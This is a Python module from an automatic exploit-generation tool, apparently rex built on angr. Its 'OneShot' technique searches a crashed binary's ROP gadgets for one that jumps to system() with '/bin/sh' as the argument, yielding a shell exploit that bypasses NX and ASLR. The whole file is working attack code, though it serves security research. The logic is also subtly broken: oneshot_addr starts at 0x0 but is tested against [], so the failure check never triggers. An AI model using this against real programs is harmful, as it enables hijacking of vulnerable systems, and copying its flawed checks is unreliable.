import logging
from angrop.errors import RopException

from ...vulnerability import Vulnerability
from .. import Exploit, CannotExploit
from ..technique import Technique


l = logging.getLogger("rex.exploit.techniques.oneshot")
l.setLevel(logging.DEBUG)

class OneShot(Technique):

    name = "oneshot"
    applicable_to = ['unix']
    oneshot_addr = 0x0
    # HACK: cmd_str can be others: $0;sh
    cmd_str = b"/bin/sh\x00"
    system = 0

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def find_system_addr(self):
        # find the address of system
        return self._find_func_address("system")

    def find_oneshot(self):
        return True

    def check(self):

        if self.rop is None:
            self.check_fail_reason("No ROP available.")
            return False

        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            self.check_fail_reason("Cannot control IP.")
            return False

        # find the address of system
        system_addr = self.find_system_addr()
        if system_addr is None:
            self.check_fail_reason("The function system() could not be found in the binary.")
            return False

        # we should be able to call system in the first place
        state = self.crash.state
        if not state.satisfiable(extra_constraints=[state.regs.pc == system_addr]):
            self.check_fail_reason("The function system() could not be called: system @ %#x" % system_addr)
            return False

        cmd_addr = next(self.crash.project.loader.main_object.memory.find(self.cmd_str), None)
        if not cmd_addr:
            self.check_fail_reason("The cmdstr %s could not be found in main_object" % self.cmd_str)
            return False
        return True


    def apply(self, cmd=b'/bin/sh', **kwargs):
        # Trying to determine the oneshot address
        system_addr = self.find_system_addr()
        if system_addr is None:
            raise CannotExploit("[%s] the function system could not be found in the binary" % self.name)
        cmd_addr = next(self.crash.project.loader.main_object.memory.find(self.cmd_str), None)
        if cmd_addr:
            cmd_addr += self.crash.project.loader.main_object.mapped_base

        state = self.crash.state
        # import IPython ; IPython.embed();
        import angrop.rop_utils as roputils

        # HACK: ugly ok
        # try every ropgadget one by one
        st = state.copy()
        # import ipdb;ipdb.set_trace();
        for g in self.rop.gadgets:
            st.regs.ip = g.addr
            l.info("try to symbolic execute from state 0x%x", g.addr)
            over = roputils.step_to_unconstrained_successor(self.rop.project,state=st)

            cond1 = over.satisfiable(extra_constraints=[over.regs.ip == system_addr])
            cond2 = over.satisfiable(extra_constraints=[over.regs.r0 == cmd_addr])

            if cond1 and cond2:
                self.oneshot_addr = g.addr
                success_state = over
                break

        if self.oneshot_addr==[]:
            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)
        self.crash.state.add_constraints(self.crash.state.ip == self.oneshot_addr)

        if not self.crash.state.satisfiable():
            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)
        return Exploit(self.crash, bypasses_nx=True, bypasses_aslr=True)
